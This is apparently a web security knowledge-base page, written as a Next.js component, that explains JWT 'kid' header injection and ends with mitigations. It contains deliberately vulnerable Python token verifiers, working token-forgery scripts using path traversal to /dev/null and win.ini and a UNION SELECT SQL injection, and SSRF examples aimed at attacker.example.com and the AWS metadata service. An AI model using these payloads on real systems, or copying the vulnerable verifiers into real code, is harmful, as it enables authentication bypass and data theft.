import type { Metadata } from "next";
import { pageMeta } from "@/lib/seo";
import { KbArticle, H2, H3, P, Mono, Ref, ImpactBox } from "@/components/layout/KbArticle";
import { CodeBlock } from "@/components/shared/CodeBlock";
import { InfoCallout } from "@/components/shared/InfoCallout";

export const metadata: Metadata = pageMeta(
  "KID Injection - Path Traversal & SQLi",
  "The kid header selects which key to use. Unsanitised, it becomes a path traversal, SQL injection, or SSRF vector.",
  "/knowledge-base/kid-injection",
);

export default function Page() {
  return (
    <KbArticle slug="kid-injection">

      <H2>The key ID parameter</H2>
      <P>
        The <Mono>kid</Mono> (Key ID) header parameter is defined in RFC 7517 §4.5 as an optional hint
        identifying which key the issuer used to sign the token. It allows a server that manages
        multiple keys (e.g., for key rotation) to look up the correct verification key without
        trying each one.
      </P>
      <P>
        The specification is deliberately vague about the format: "The structure of the <Mono>kid</Mono> value
        is unspecified." In practice, implementations resolve it against a filesystem path, a database row,
        an in-memory keystore, or even a URL - and when this resolution is performed with attacker-supplied
        input without sanitization, the consequences range from authentication bypass to server-side code execution.
      </P>

      <H2>Path traversal variant</H2>
      <P>
        When the server resolves <Mono>kid</Mono> as a filesystem path to load the signing key,
        path traversal sequences allow the attacker to substitute any readable file on the server as the "key."
        Two particularly useful targets are:
      </P>
      <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 1.9, marginBottom: "20px" }}>
        <li><Mono>/dev/null</Mono> (Linux) - reads as an empty string; sign with an empty HMAC secret</li>
        <li><Mono>/proc/self/cmdline</Mono> - process command line; predictable on known environments</li>
        <li>Any world-readable static file with known content - sign with that file's bytes as the HMAC secret</li>
      </ul>
      <CodeBlock language="python" label="Vulnerable server (Python)" code={`import jwt, os

def verify_token(token: str):
    header = jwt.get_unverified_header(token)
    kid = header.get("kid", "default")

    # VULNERABLE: kid used directly as file path
    key_path = f"/var/keys/{kid}"
    with open(key_path, "rb") as f:
        key = f.read()

    return jwt.decode(token, key, algorithms=["HS256"])`} />
      <CodeBlock language="python" label="Attack - /dev/null traversal" code={`import base64, hmac, hashlib, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# kid that traverses to /dev/null → empty key
header  = b64url(json.dumps({"alg": "HS256", "kid": "../../dev/null"}))
payload = b64url(json.dumps({"sub": "admin", "role": "admin", "exp": 9999999999}))

# Sign with empty string (contents of /dev/null)
sig = hmac.new(b"", f"{header}.{payload}".encode(), hashlib.sha256).digest()
token = f"{header}.{payload}.{b64url(sig)}"
print(token)  # Server will load /dev/null as key → verify passes`} />

      <H3>Windows path traversal</H3>
      <P>
        On Windows servers, the equivalent technique uses Windows path separators
        and targets files like <Mono>NUL</Mono> (equivalent to <Mono>/dev/null</Mono>)
        or <Mono>C:\Windows\win.ini</Mono> (known content, readable by all users):
      </P>
      <CodeBlock language="python" label="Windows variants" code={`# Windows null device
"kid": "..\\..\\..\\Windows\\System32\\NUL"

# Known-content file (win.ini starts with a predictable header)
"kid": "..\\..\\..\\Windows\\win.ini"
# Sign token with the exact bytes of win.ini as HMAC secret`} />

      <H2>SQL injection variant</H2>
      <P>
        When the server queries a database for the key using the <Mono>kid</Mono> value, SQL injection
        allows the attacker to make the query return an arbitrary value - one they control.
        By injecting a UNION SELECT, they can make the key lookup return any string, then sign
        the forged token with that same string as the HMAC secret.
      </P>
      <CodeBlock language="python" label="Vulnerable server - SQL query" code={`import sqlite3, jwt

def verify_token(token: str):
    header = jwt.get_unverified_header(token)
    kid = header["kid"]

    # VULNERABLE: unsanitized interpolation into SQL
    conn = sqlite3.connect("keys.db")
    row = conn.execute(f"SELECT key_value FROM keys WHERE id = '{kid}'").fetchone()
    if not row:
        raise ValueError("Key not found")

    return jwt.decode(token, row[0].encode(), algorithms=["HS256"])`} />
      <CodeBlock language="python" label="Attack - SQLi via kid" code={`# Target: SELECT key_value FROM keys WHERE id = '<kid>'
# Inject: close the string, add UNION SELECT with known value

# Payload: kid = "x' UNION SELECT 'pwned'--"
# Resulting query: SELECT key_value FROM keys WHERE id = 'x'
#                  UNION SELECT 'pwned'--'
# Returns: 'pwned'

inject = "x' UNION SELECT 'pwned'--"
header  = b64url(json.dumps({"alg": "HS256", "kid": inject}))
payload = b64url(json.dumps({"sub": "admin", "exp": 9999999999}))

# Sign with "pwned" - the value we injected via SQL
sig = hmac.new(b"pwned", f"{header}.{payload}".encode(), hashlib.sha256).digest()
token = f"{header}.{payload}.{b64url(sig)}"`} />

      <InfoCallout variant="warning" title="Stacked queries and out-of-band exfiltration">
        Depending on the database driver, stacked queries (<Mono>; DROP TABLE keys--</Mono>)
        or out-of-band channels (DNS lookups via <Mono>load_file()</Mono> in MySQL) may also be possible.
        The kid SQLi surface is often unmonitored since it is not a typical API endpoint.
      </InfoCallout>

      <H2>SSRF via URL-type kid</H2>
      <P>
        Some implementations accept a full URL in the <Mono>kid</Mono> field and fetch the key from it -
        treating <Mono>kid</Mono> as a JKU-equivalent. This creates an SSRF vector:
      </P>
      <CodeBlock language="python" label="URL-type kid → SSRF" code={`# kid: "https://attacker.example.com/key.pem"
# Server fetches the URL and uses its content as the signing key
# Attacker hosts a key they control → full token forgery

# Also useful for SSRF to internal services:
# kid: "http://169.254.169.254/latest/meta-data/"  → AWS IMDS
# kid: "file:///etc/passwd"                        → file read (some implementations)`} />

      <H2>The empty string / null byte trick</H2>
      <P>
        When path traversal to <Mono>/dev/null</Mono> is not directly possible but the key lookup
        returns an empty value for a non-existent <Mono>kid</Mono>, some libraries will verify the
        signature against an empty key. Sign the forged token with an empty HMAC secret:
      </P>
      <CodeBlock language="python" label="Empty key signature" code={`sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
# Works when: server loads key="" for missing kid, and library accepts empty secret`} />

      <ImpactBox title="Bug bounty confirmed cases">
        <ul className="refs-list" style={{ lineHeight: 2 }}>
          <li>Path traversal via <Mono>kid</Mono> reported on multiple HackerOne programs targeting API gateway products and identity middleware</li>
          <li>SQLi via <Mono>kid</Mono> demonstrated in PortSwigger's lab and confirmed in real enterprise middleware deployments</li>
          <li>SSRF via URL-type <Mono>kid</Mono> chained to internal metadata service access (IMDS) in cloud environments</li>
          <li>Critical severity ratings common when combined with <Mono>role=admin</Mono> claim forgery</li>
        </ul>
      </ImpactBox>

      <H2>Mitigations</H2>
      <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 2, marginBottom: "24px" }}>
        <li>Validate <Mono>kid</Mono> against an allowlist of known key identifiers - reject anything not in the list</li>
        <li>Never use <Mono>kid</Mono> as a direct database query parameter without parameterised queries</li>
        <li>Never resolve <Mono>kid</Mono> as a filesystem path; use it only as a map key into a pre-loaded in-memory keystore</li>
        <li>Reject <Mono>kid</Mono> values containing path separators, SQL metacharacters, or URL schemes</li>
        <li>If URL-type <Mono>kid</Mono> is required, enforce a strict allowlist of trusted domains</li>
      </ul>

      <div>
        <div style={{ fontSize: "12px", fontWeight: 600, color: "var(--text-muted)", marginBottom: "12px", textTransform: "uppercase", letterSpacing: "0.06em" }}>References</div>
        <ul className="refs-list" style={{ fontSize: "13px", color: "var(--text-muted)", lineHeight: 2 }}>
          <li><Ref href="https://portswigger.net/web-security/jwt/exploiting#injecting-self-signed-jwts-via-the-kid-parameter">PortSwigger - JWT kid parameter path traversal</Ref></li>
          <li><Ref href="https://www.rfc-editor.org/rfc/rfc7517#section-4.5">RFC 7517 §4.5 - "kid" (Key ID) Parameter</Ref></li>
          <li><Ref href="https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html">HackTricks - Hacking JWT Tokens</Ref></li>
        </ul>
      </div>

    </KbArticle>
  );
}
